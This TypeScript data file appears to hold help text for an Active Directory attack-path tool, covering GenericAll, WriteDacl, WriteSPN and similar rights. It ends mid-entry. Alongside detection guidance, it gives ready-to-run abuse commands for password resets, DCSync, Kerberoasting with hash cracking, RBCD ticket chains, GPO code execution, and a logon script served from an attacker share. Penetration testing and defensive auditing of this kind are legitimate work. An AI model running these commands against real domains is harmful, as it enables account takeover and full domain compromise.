import type { EdgeHelpText } from './types';

export const adObjectManipulationEdges: EdgeHelpText[] = [
  {
    kind: 'GenericAll',
    category: 'Object Manipulation',
    general:
      'The GenericAll permission grants full control over the target object. This includes the ability to change all properties, modify group membership, reset passwords, write to any attribute, and perform any other operation on the object. This is functionally equivalent to being the owner of the object and is one of the most powerful permissions in Active Directory. GenericAll applies regardless of the target object type and encompasses all other permissions combined.',
    windowsAbuse: `If targeting a User object:
# Force change the user's password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Or perform targeted Kerberoasting by setting an SPN
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/YOURVALUE'}
Rubeus.exe kerberoast /user:targetuser /nowrap

# Or add Shadow Credentials
Whisker.exe add /target:targetuser /domain:domain.local /dc:dc.domain.local

If targeting a Group object:
# Add yourself to the group
Add-DomainGroupMember -Identity 'Target Group' -Members 'attacker'

If targeting a Computer object:
# Perform RBCD attack
Set-DomainObject -Identity targetcomputer$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
# Then use Rubeus S4U as described in the AllowedToAct edge

# Or add Shadow Credentials to the computer
Whisker.exe add /target:targetcomputer$ /domain:domain.local /dc:dc.domain.local

If targeting a GPO:
# Use SharpGPOAbuse for code execution
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Target GPO"

If targeting a Domain object:
# Grant yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync`,
    linuxAbuse: `If targeting a User object:
# Force change the password using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set password targetuser 'NewPassword123!'

# Or using impacket
net rpc password "targetuser" "NewPassword123!" -U "domain.local"/"attacker"%"Password" -S dc.domain.local

# Or perform targeted Kerberoasting
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object targetuser --attr servicePrincipalName --value 'nonexistent/YOURVALUE'
GetUserSPNs.py -request -dc-ip dc.domain.local domain.local/attacker:'Password'

# Or add Shadow Credentials using pywhisker
python3 pywhisker.py -d domain.local -u attacker -p 'Password' --target targetuser --action add --dc-ip dc.domain.local

If targeting a Group object:
# Add member using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add groupMember 'Target Group' attacker

If targeting a Computer object:
# Set up RBCD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add rbcd 'targetcomputer$' 'FAKECOMPUTER$'

# Or add Shadow Credentials
python3 pywhisker.py -d domain.local -u attacker -p 'Password' --target 'targetcomputer$' --action add --dc-ip dc.domain.local`,
    opsec:
      'GenericAll abuse generates different events depending on the action taken. Password resets generate Event ID 4724 (An attempt was made to reset an account\'s password). Group membership changes generate Event ID 4728/4732/4756. SPN modifications generate Event ID 5136 (A directory service object was modified). ACL modifications generate Event ID 4670 (Permissions on an object were changed) and Event ID 5136. Shadow Credentials modifications generate Event ID 5136 with the msDS-KeyCredentialLink attribute. All of these operations are commonly monitored and should be considered high-risk from an OPSEC perspective.',
    references: [
      {
        title: 'BloodHound Documentation - GenericAll',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll',
      },
      {
        title: 'adsecurity.org - Active Directory ACL Abuse',
        url: 'https://adsecurity.org/?p=3658',
      },
      {
        title: 'The Hacker Recipes - ACL Abuse',
        url: 'https://www.thehacker.recipes/ad/movement/dacl',
      },
      {
        title: 'SpecterOps - An ACE Up The Sleeve',
        url: 'https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-5c23d273e4c2',
      },
    ],
  },
  {
    kind: 'GenericWrite',
    category: 'Object Manipulation',
    general:
      'The GenericWrite permission grants the ability to write to any non-protected attribute of the target object. While not as comprehensive as GenericAll (it does not include the ability to modify the DACL or change ownership), GenericWrite enables several powerful abuse paths including setting SPNs for targeted Kerberoasting, modifying the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for RBCD, writing to msDS-KeyCredentialLink for Shadow Credentials, and modifying the scriptPath or other logon script attributes for code execution.',
    windowsAbuse: `Targeted Kerberoasting (User target):
# Set an SPN on the target user, then Kerberoast
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/YOURVALUE'}
Rubeus.exe kerberoast /user:targetuser /nowrap
# Clean up: remove the SPN after obtaining the hash
Set-DomainObject -Identity targetuser -Clear serviceprincipalname

Shadow Credentials (User or Computer target):
# Add a Key Credential to the target
Whisker.exe add /target:targetuser /domain:domain.local /dc:dc.domain.local
# Whisker will output a Rubeus command to request a TGT using the certificate

RBCD (Computer target):
# Set the RBCD attribute (see AllowedToAct for full steps)
Set-DomainObject -Identity targetcomputer$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

Logon Script abuse (User target):
# Set a malicious logon script
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\\\attacker\\share\\malicious.bat'}`,
    linuxAbuse: `Targeted Kerberoasting:
# Set an SPN on the target user
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object targetuser --attr servicePrincipalName --value 'nonexistent/YOURVALUE'

# Kerberoast the user
GetUserSPNs.py -request -dc-ip dc.domain.local domain.local/attacker:'Password' -outputfile kerberoast.hash

# Clean up
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object targetuser --attr servicePrincipalName

Shadow Credentials:
python3 pywhisker.py -d domain.local -u attacker -p 'Password' --target targetuser --action add --dc-ip dc.domain.local
# Then use the certificate with getTGT.py

RBCD (Computer target):
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add rbcd 'targetcomputer$' 'FAKECOMPUTER$'

Logon Script:
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object targetuser --attr scriptPath --value '\\\\attacker\\share\\malicious.bat'`,
    opsec:
      'SPN modifications generate Event ID 5136 (A directory service object was modified) with the servicePrincipalName attribute. Shadow Credentials generate Event ID 5136 with the msDS-KeyCredentialLink attribute. RBCD generates Event ID 5136 with the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Script path changes generate Event ID 5136. Targeted Kerberoasting is detectable by monitoring for SPN changes followed by TGS requests (Event ID 4769) for the modified user. Monitor for Event ID 5136 on sensitive attributes from unexpected principals.',
    references: [
      {
        title: 'BloodHound Documentation - GenericWrite',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347918107-GenericWrite',
      },
      {
        title: 'SpecterOps - Shadow Credentials',
        url: 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab',
      },
      {
        title: 'The Hacker Recipes - Targeted Kerberoasting',
        url: 'https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting',
      },
    ],
  },
  {
    kind: 'WriteDacl',
    category: 'Object Manipulation',
    general:
      'The WriteDacl permission grants the ability to modify the Discretionary Access Control List (DACL) of the target object. The DACL defines which security principals have what permissions on the object. An attacker with WriteDacl can grant themselves any permission on the target — including GenericAll — effectively giving full control over the object. This is one of the most dangerous delegated permissions because it enables permission escalation: the attacker writes a new ACE granting themselves full control, then uses that full control for the actual attack.',
    windowsAbuse: `# Grant yourself GenericAll on the target object using PowerView
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# Grant yourself DCSync rights on the domain
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Grant yourself specific rights
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights ResetPassword

# After granting yourself GenericAll, proceed with the GenericAll abuse techniques:
# For users: force change password, targeted Kerberoast, Shadow Credentials
# For groups: add yourself as a member
# For computers: RBCD attack

# Clean up: remove the ACE after exploitation (OPSEC)
Remove-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All`,
    linuxAbuse: `# Using bloodyAD to modify the DACL
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add genericAll 'OU=target,DC=domain,DC=local' attacker

# Using impacket's dacledit.py
dacledit.py -action write -rights FullControl -principal attacker -target targetuser domain.local/attacker:'Password'

# Grant DCSync rights
dacledit.py -action write -rights DCSync -principal attacker -target 'DC=domain,DC=local' domain.local/attacker:'Password'

# After granting yourself permissions, use the appropriate abuse technique
# For users:
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set password targetuser 'NewPassword123!'

# Clean up: remove the added ACE
dacledit.py -action remove -rights FullControl -principal attacker -target targetuser domain.local/attacker:'Password'`,
    opsec:
      'DACL modifications generate Event ID 4670 (Permissions on an object were changed) and Event ID 5136 (A directory service object was modified) with the nTSecurityDescriptor attribute. These events record the old and new security descriptors, making the change fully auditable. Event ID 4662 may also be generated for the write operation. DACL modifications to sensitive objects (domain head, AdminSDHolder, Domain Controllers OU) should trigger immediate alerts. Monitor for ACE additions that grant powerful rights (GenericAll, WriteDacl, WriteOwner, DCSync-equivalent) to non-administrative principals.',
    references: [
      {
        title: 'BloodHound Documentation - WriteDacl',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312352014619-WriteDacl',
      },
      {
        title: 'SpecterOps - ACL Abuse',
        url: 'https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-5c23d273e4c2',
      },
      {
        title: 'The Hacker Recipes - WriteDacl',
        url: 'https://www.thehacker.recipes/ad/movement/dacl/grant-rights',
      },
    ],
  },
  {
    kind: 'WriteOwner',
    category: 'Object Manipulation',
    general:
      'The WriteOwner permission grants the ability to change the owner of the target object. The owner of an AD object implicitly has WriteDacl permission on that object, meaning they can modify the DACL to grant themselves any other permission. An attacker with WriteOwner can take ownership of the target, then modify the DACL to grant GenericAll, effectively gaining full control. This is a two-step escalation: first take ownership, then modify the DACL.',
    windowsAbuse: `# Step 1: Take ownership of the target object using PowerView
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity attacker

# Step 2: Grant yourself GenericAll via the DACL
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# Step 3: Proceed with the appropriate abuse technique for GenericAll
# For users:
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Alternative: directly grant specific rights after taking ownership
Set-DomainObjectOwner -Identity 'Target Group' -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity 'Target Group' -PrincipalIdentity attacker -Rights WriteMembers
Add-DomainGroupMember -Identity 'Target Group' -Members 'attacker'`,
    linuxAbuse: `# Step 1: Take ownership using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set owner targetuser attacker

# Or using impacket's owneredit.py
owneredit.py -action write -owner attacker -target targetuser domain.local/attacker:'Password'

# Step 2: Grant yourself GenericAll
dacledit.py -action write -rights FullControl -principal attacker -target targetuser domain.local/attacker:'Password'

# Step 3: Abuse GenericAll
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set password targetuser 'NewPassword123!'

# One-liner approach with bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set owner targetuser attacker
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add genericAll targetuser attacker
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set password targetuser 'NewPassword123!'`,
    opsec:
      'Ownership changes generate Event ID 4670 (Permissions on an object were changed) with the old and new owner recorded. Event ID 5136 (A directory service object was modified) is also generated for the nTSecurityDescriptor attribute change. The subsequent DACL modification generates additional Event ID 4670 and 5136 events. This two-step process (ownership change followed by DACL modification) creates a distinctive audit trail. Monitor for ownership changes on sensitive objects from non-administrative principals.',
    references: [
      {
        title: 'BloodHound Documentation - WriteOwner',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312352408731-WriteOwner',
      },
      {
        title: 'The Hacker Recipes - WriteOwner',
        url: 'https://www.thehacker.recipes/ad/movement/dacl/grant-ownership',
      },
      {
        title: 'HackTricks - ACL Abuse',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse.html',
      },
    ],
  },
  {
    kind: 'ForceChangePassword',
    category: 'Object Manipulation',
    general:
      'The ForceChangePassword permission (also known as the User-Force-Change-Password extended right) grants the ability to reset a target user\'s password without knowing the current password. This is distinct from the Change Password right, which requires knowledge of the current password. This is one of the most direct privilege escalation paths in AD: an attacker can reset the target user\'s password and then authenticate as that user, gaining all of their privileges.',
    windowsAbuse: `# Using PowerView to reset the user's password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# Using net.exe
net user targetuser NewPassword123! /domain

# Using the Set-ADAccountPassword cmdlet (RSAT)
Set-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# After resetting the password, authenticate as the target user
runas /user:domain\\targetuser cmd.exe`,
    linuxAbuse: `# Using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set password targetuser 'NewPassword123!'

# Using impacket's net module
net rpc password "targetuser" "NewPassword123!" -U "domain.local"/"attacker"%"Password" -S dc.domain.local

# Using rpcclient
rpcclient -U 'domain.local/attacker%Password' dc.domain.local -c 'setuserinfo2 targetuser 23 "NewPassword123!"'

# Using pywerview
set-domainuserpassword -Identity targetuser -AccountPassword 'NewPassword123!' -Server dc.domain.local -User attacker -Password 'Password'

# After resetting, authenticate as the target
getTGT.py domain.local/targetuser:'NewPassword123!' -dc-ip dc.domain.local`,
    opsec:
      'Password resets generate Event ID 4724 (An attempt was made to reset an account\'s password) on the Domain Controller. This event logs the caller (the attacker) and the target account. Event ID 4723 (An attempt was made to change an account\'s password) is generated for password changes (which require the old password). Event ID 4625 (An account failed to log on) may be generated if the target user has active sessions that fail with the old password. Password resets are commonly monitored, especially for privileged accounts. The target user will also be unable to log in with their old password, potentially raising suspicion.',
    references: [
      {
        title: 'BloodHound Documentation - ForceChangePassword',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347096091-ForceChangePassword',
      },
      {
        title: 'The Hacker Recipes - ForceChangePassword',
        url: 'https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword',
      },
    ],
  },
  {
    kind: 'AddMember',
    category: 'Object Manipulation',
    general:
      'The AddMember permission (the Write Member extended right on a group object) grants the ability to add any principal as a member of the target group. This is a direct path to privilege escalation when the target group has elevated permissions. For example, adding an attacker-controlled account to Domain Admins, Exchange Windows Permissions, or any group with delegated admin rights immediately grants those privileges. Group nesting can amplify the impact — adding a member to one group may transitively grant membership in other groups.',
    windowsAbuse: `# Using PowerView to add a member to the target group
Add-DomainGroupMember -Identity 'Target Group' -Members 'attacker'

# Verify the membership
Get-DomainGroupMember -Identity 'Target Group'

# Using net.exe
net group "Target Group" attacker /add /domain

# Using the Active Directory PowerShell module (RSAT)
Add-ADGroupMember -Identity 'Target Group' -Members attacker`,
    linuxAbuse: `# Using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add groupMember 'Target Group' attacker

# Using net rpc
net rpc group addmem "Target Group" attacker -U domain.local/attacker%'Password' -S dc.domain.local

# Using pywerview
add-domaingroupmember -Identity 'Target Group' -Members attacker -Server dc.domain.local -User attacker -Password 'Password'

# Verify
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local get object 'Target Group' --attr member`,
    opsec:
      'Adding a group member generates Event ID 4728 (A member was added to a security-enabled global group), Event ID 4732 (A member was added to a security-enabled local group), or Event ID 4756 (A member was added to a security-enabled universal group), depending on the group scope. The event logs the caller, the added member, and the target group. Changes to privileged groups trigger additional Event ID 4672 (Special privileges assigned to new logon) when the new member next authenticates. AdminSDHolder protection checks run hourly and will flag manual ACL changes on protected groups.',
    references: [
      {
        title: 'BloodHound Documentation - AddMember',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312762799515-AddMember',
      },
      {
        title: 'adsecurity.org - Privileged Groups',
        url: 'https://adsecurity.org/?p=3700',
      },
    ],
  },
  {
    kind: 'AddSelf',
    category: 'Object Manipulation',
    general:
      'The AddSelf permission (the Self-Membership right on a group object) grants a principal the ability to add themselves — and only themselves — to the target group. This is more restrictive than AddMember, which can add any principal. However, it still enables direct privilege escalation if the target group has elevated permissions. AddSelf is sometimes delegated for self-service group management scenarios, where users can opt into certain groups.',
    windowsAbuse: `# Using PowerView to add yourself to the target group
Add-DomainGroupMember -Identity 'Target Group' -Members 'attacker'

# Using net.exe
net group "Target Group" attacker /add /domain

# Using the Active Directory PowerShell module (RSAT)
Add-ADGroupMember -Identity 'Target Group' -Members attacker`,
    linuxAbuse: `# Using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add groupMember 'Target Group' attacker

# Using net rpc
net rpc group addmem "Target Group" attacker -U domain.local/attacker%'Password' -S dc.domain.local`,
    opsec:
      'The same Event IDs as AddMember apply: Event ID 4728 (global group), 4732 (local group), or 4756 (universal group). The key difference is that with AddSelf, the caller and the added member are the same principal, which may be legitimate for self-service groups. Monitor for self-additions to privileged groups that are not designated as self-service.',
    references: [
      {
        title: 'BloodHound Documentation - AddSelf',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312762994587-AddSelf',
      },
    ],
  },
  {
    kind: 'AllExtendedRights',
    category: 'Object Manipulation',
    general:
      'The AllExtendedRights permission grants all extended rights on the target object. Extended rights are special operations defined in the AD schema that go beyond standard read/write permissions. Key extended rights include User-Force-Change-Password (reset passwords without knowing the current one), DS-Replication-Get-Changes and DS-Replication-Get-Changes-All (DCSync), and Receive-As / Send-As (Exchange permissions). The impact depends on the target object type: on a user it enables password resets, on the domain head it enables DCSync, and on a computer it enables reading LAPS passwords.',
    windowsAbuse: `On a User object:
# Force change the user's password (User-Force-Change-Password extended right)
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

On the Domain object:
# DCSync (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

On a Computer object:
# Read LAPS password
Get-DomainComputer target -Properties ms-mcs-admpwd | Select-Object -ExpandProperty ms-mcs-admpwd

# Read BitLocker recovery keys
Get-ADObject -Filter {objectclass -eq 'msFVE-RecoveryInformation'} -SearchBase "CN=target,OU=Computers,DC=domain,DC=local" -Properties msFVE-RecoveryPassword`,
    linuxAbuse: `On a User object:
# Force change password
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set password targetuser 'NewPassword123!'

On the Domain object:
# DCSync
secretsdump.py domain.local/attacker:'Password'@dc.domain.local -just-dc

On a Computer object:
# Read LAPS password
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local get object 'target$' --attr ms-Mcs-AdmPwd

# Using CrackMapExec
crackmapexec ldap dc.domain.local -u attacker -p 'Password' --module laps`,
    opsec:
      'AllExtendedRights abuse generates events specific to the action taken. Password resets generate Event ID 4724. DCSync generates Event ID 4662 with the DS-Replication GUIDs. LAPS password reads generate Event ID 4662 with the ms-Mcs-AdmPwd GUID. The AllExtendedRights permission itself can be identified by auditing the ACL of sensitive objects — Event ID 4670 logs DACL changes that may grant or revoke this right. Monitor for non-administrative accounts exercising extended rights on sensitive objects.',
    references: [
      {
        title: 'BloodHound Documentation - AllExtendedRights',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312764198171-AllExtendedRights',
      },
      {
        title: 'The Hacker Recipes - DACL',
        url: 'https://www.thehacker.recipes/ad/movement/dacl',
      },
      {
        title: 'HackTricks - ACL Abuse',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse.html',
      },
    ],
  },
  {
    kind: 'Owns',
    category: 'Object Manipulation',
    general:
      'The Owns edge indicates that a principal is the owner of the target object. In Active Directory, the owner of an object implicitly has the WriteDacl permission, allowing them to modify the DACL to grant themselves or others any permission on the object. Ownership is set when an object is created (the creator becomes the owner) and can be changed by principals with the WriteOwner permission or by administrators. Object ownership is often overlooked in security audits, making it a valuable persistence mechanism.',
    windowsAbuse: `# As the owner, you implicitly have WriteDacl. Grant yourself GenericAll:
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# Then proceed with GenericAll abuse techniques:
# For users: force change password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# For groups: add yourself
Add-DomainGroupMember -Identity 'Target Group' -Members 'attacker'

# For computers: RBCD
Set-DomainObject -Identity targetcomputer$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`,
    linuxAbuse: `# As the owner, grant yourself GenericAll using dacledit
dacledit.py -action write -rights FullControl -principal attacker -target targetuser domain.local/attacker:'Password'

# Then proceed with abuse:
# For users:
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set password targetuser 'NewPassword123!'

# For groups:
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add groupMember 'Target Group' attacker

# For computers:
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add rbcd 'targetcomputer$' 'FAKECOMPUTER$'`,
    opsec:
      'DACL modifications by the owner generate Event ID 4670 (Permissions on an object were changed) and Event ID 5136 (A directory service object was modified). The subsequent abuse actions generate their own respective events. Ownership itself does not generate events when used to read/modify the DACL — only the actual DACL change is logged. Monitor the owner field of sensitive objects using periodic ACL audits, as ownership changes may not always generate alerts if auditing is not properly configured.',
    references: [
      {
        title: 'BloodHound Documentation - Owns',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312349696667-Owns',
      },
      {
        title: 'SpecterOps - ACL Backdoors',
        url: 'https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-5c23d273e4c2',
      },
    ],
  },
  {
    kind: 'WriteAccountRestrictions',
    category: 'Object Manipulation',
    general:
      'The WriteAccountRestrictions permission grants the ability to write to attributes in the Account Restrictions property set on the target object. This includes the msDS-AllowedToActOnBehalfOfOtherIdentity attribute, which controls Resource-Based Constrained Delegation (RBCD). An attacker with this permission on a computer object can configure RBCD to impersonate any user to any service on that computer, effectively gaining local admin access. This is a subtle permission that is frequently overlooked in security reviews.',
    windowsAbuse: `# Configure RBCD on the target computer (same as AllowedToAct attack chain)
# Step 1: Create or use a controlled computer account
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Step 2: Get the SID and build the security descriptor
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Step 3: Set the RBCD attribute
Set-DomainObject -Identity targetcomputer$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: S4U chain
Rubeus.exe hash /password:Password123!
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt`,
    linuxAbuse: `# Step 1: Create a machine account
addcomputer.py -computer-name 'FAKECOMPUTER$' -computer-pass 'Password123!' -dc-ip 10.0.0.1 domain.local/attacker:'Password'

# Step 2: Configure RBCD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add rbcd 'targetcomputer$' 'FAKECOMPUTER$'

# Or using rbcd.py
rbcd.py -delegate-from 'FAKECOMPUTER$' -delegate-to 'targetcomputer$' -action write domain.local/attacker:'Password'

# Step 3: S4U chain
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip 10.0.0.1 domain.local/'FAKECOMPUTER$':'Password123!'

# Step 4: Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.domain.local`,
    opsec:
      'The RBCD attribute modification generates Event ID 5136 (A directory service object was modified) with the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Machine account creation via MachineAccountQuota generates Event ID 4741 (A computer account was created). The S4U2Self and S4U2Proxy exchanges generate Event ID 4769 (TGS requested). Monitor for changes to the RBCD attribute and new machine accounts created by standard users. Consider reducing MachineAccountQuota to 0 to prevent standard users from creating machine accounts.',
    references: [
      {
        title: 'BloodHound Documentation - WriteAccountRestrictions',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312351861275-WriteAccountRestrictions',
      },
      {
        title: 'The Hacker Recipes - RBCD',
        url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd',
      },
    ],
  },
  {
    kind: 'WriteGPLink',
    category: 'Object Manipulation',
    general:
      'The WriteGPLink permission grants the ability to modify the gpLink attribute on an Organizational Unit, Domain, or Site, which controls which Group Policy Objects are linked to that container. An attacker with this permission can link a malicious or attacker-controlled GPO to the target container, causing all objects within that container to process the GPO settings. If the attacker also has write access to a GPO (or can create a new one), they can achieve code execution on all computers in the OU or modify security settings for all users in the OU.',
    windowsAbuse: `# Step 1: Create a new GPO (requires appropriate rights) or identify an existing writable GPO
New-GPO -Name "Malicious GPO"

# Step 2: Configure the GPO for code execution using SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Malicious GPO"

# Step 3: Link the GPO to the target OU
Set-DomainObject -Identity 'OU=Targets,DC=domain,DC=local' -Set @{gPLink='[LDAP://CN={GPO-GUID},CN=Policies,CN=System,DC=domain,DC=local;0]'}

# Or using PowerShell Group Policy module
New-GPLink -Name "Malicious GPO" -Target "OU=Targets,DC=domain,DC=local"`,
    linuxAbuse: `# Using bloodyAD to link a GPO to an OU
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object 'OU=Targets,DC=domain,DC=local' --attr gPLink --value '[LDAP://CN={GPO-GUID},CN=Policies,CN=System,DC=domain,DC=local;0]'

# Using pyGPOAbuse to configure the GPO content
python3 pygpoabuse.py domain.local/attacker:'Password' -gpo-id "GPO-GUID" -command 'net localgroup administrators attacker /add' -taskname 'Update' -f`,
    opsec:
      'GPO link modifications generate Event ID 5136 (A directory service object was modified) with the gPLink attribute on the target container. Group Policy processing events appear in the GroupPolicy operational log on clients. Event ID 4670 may also be generated. Monitor for unexpected GPO links, especially to high-value OUs (Domain Controllers, Servers, Admin workstations). GPO link changes are relatively uncommon in most environments, making anomaly detection feasible.',
    references: [
      {
        title: 'BloodHound Documentation - WriteGPLink',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17583679025307-WriteGPLink',
      },
      {
        title: 'SpecterOps - GPO Abuse',
        url: 'https://posts.specterops.io/abusing-gpo-permissions-5e58a218e1db',
      },
    ],
  },
  {
    kind: 'WriteSPN',
    category: 'Object Manipulation',
    general:
      'The WriteSPN permission grants the ability to modify the servicePrincipalName attribute on the target object. This is the key permission needed for a targeted Kerberoasting attack: the attacker sets an SPN on a target user account, then requests a Kerberos service ticket for that SPN, which is encrypted with the user\'s password hash. The ticket can be cracked offline to recover the plaintext password. This technique is particularly effective against accounts with weak passwords and is stealthy because Kerberos service ticket requests are a normal part of AD operations.',
    windowsAbuse: `# Step 1: Set an SPN on the target user using PowerView
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/YOURVALUE'}

# Step 2: Kerberoast the target user
Rubeus.exe kerberoast /user:targetuser /nowrap

# Or using PowerView
Invoke-Kerberoast -Identity targetuser -OutputFormat Hashcat

# Step 3: Crack the hash offline
hashcat -m 13100 kerberoast.hash wordlist.txt

# Step 4: Clean up - remove the SPN
Set-DomainObject -Identity targetuser -Clear serviceprincipalname`,
    linuxAbuse: `# Step 1: Set an SPN on the target user
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object targetuser --attr servicePrincipalName --value 'nonexistent/YOURVALUE'

# Or using pywerview
set-domainobject -Identity targetuser -Set @{serviceprincipalname='nonexistent/YOURVALUE'} -Server dc.domain.local -User attacker -Password 'Password'

# Step 2: Request and extract the service ticket
GetUserSPNs.py -request -dc-ip dc.domain.local domain.local/attacker:'Password' -outputfile kerberoast.hash

# Step 3: Crack the hash offline
hashcat -m 13100 kerberoast.hash wordlist.txt

# Step 4: Clean up
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object targetuser --attr servicePrincipalName`,
    opsec:
      'SPN modification generates Event ID 5136 (A directory service object was modified) with the servicePrincipalName attribute. The subsequent Kerberos service ticket request generates Event ID 4769 (A Kerberos service ticket was requested) with the new SPN. Detecting targeted Kerberoasting requires correlating SPN changes (Event ID 5136) with subsequent TGS requests (Event ID 4769). If encryption type 0x17 (RC4) is requested in the TGS, this is an additional indicator since modern environments should prefer AES encryption. SPN changes on user accounts (not computer accounts) are inherently suspicious.',
    references: [
      {
        title: 'BloodHound Documentation - WriteSPN',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312353024027-WriteSPN',
      },
      {
        title: 'adsecurity.org - Kerberoasting',
        url: 'https://adsecurity.org/?p=3458',
      },
      {
        title: 'The Hacker Recipes - Kerberoasting',
        url: 'https://www.thehacker.recipes/ad/movement/kerberos/kerberoast',
      },
    ],
  },
  {
    kind: 'AddAllowedToAct',
    category: 'Object Manipulation',
    general:
